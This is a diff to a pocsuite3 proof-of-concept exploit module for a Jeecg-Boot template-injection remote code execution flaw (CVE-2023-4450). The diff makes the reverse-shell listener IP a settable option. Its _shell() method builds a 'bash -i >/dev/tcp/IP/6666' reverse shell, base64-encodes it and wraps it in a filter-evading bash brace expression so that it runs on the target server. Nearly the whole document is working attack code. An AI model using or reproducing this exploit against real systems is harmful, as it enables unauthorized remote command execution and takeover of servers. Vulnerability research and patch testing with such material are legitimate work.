@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-import json,base64
+import json,base64,time
 from pocsuite3.api import (
     minimum_version_required, POCBase, register_poc, requests, logger,
-    OptString, OrderedDict,
+    OptString, OrderedDict,REVERSE_PAYLOAD,POC_CATEGORY,
     random_str,
 )
 
@@ -18,7 +18,7 @@ class DemoPOC(POCBase):
     createDate = '2024-03-31'
     updateDate = '2024-03-31'
     references = []
-    name = 'Jeecg-Boot-SSTL-RCE'
+    name = 'Jeecg-Boot-SSTL-RCE(CVE-2023-4450)'
     appPowerLink = 'http://www.jeecg.com/'
     appName = 'Jeecg-Boot'
     appVersion = '3.5.0'
@@ -34,6 +34,7 @@ class DemoPOC(POCBase):
     def _options(self):
         o = OrderedDict()
         o['cmd'] = OptString('whoami', description='The command to execute')
+        o['ip'] = OptString('172.16.10.16', description='设置反弹shell ip')
         return o
 
     def _exploit(self, param=''):
@@ -75,9 +76,10 @@ class DemoPOC(POCBase):
 
     def _shell(self):
         try:
-            cmd = 'bash -i >/dev/tcp/172.16.10.16/6666 0>&1'
+            ip = self.get_option('ip')
+            cmd = 'bash -i >/dev/tcp/'+ip+'/6666 0>&1'
             encoder = base64.b64encode(cmd.encode("utf-8"))
-            param = "bash -c {echo,"+encoder.decode("utf-8")+"}|{base64,-d}|{bash,-i}"
+            param =  "bash -c {echo,"+encoder.decode("utf-8")+"}|{base64,-d}|{bash,-i}"
             self._exploit(param)
         except Exception:
             pass
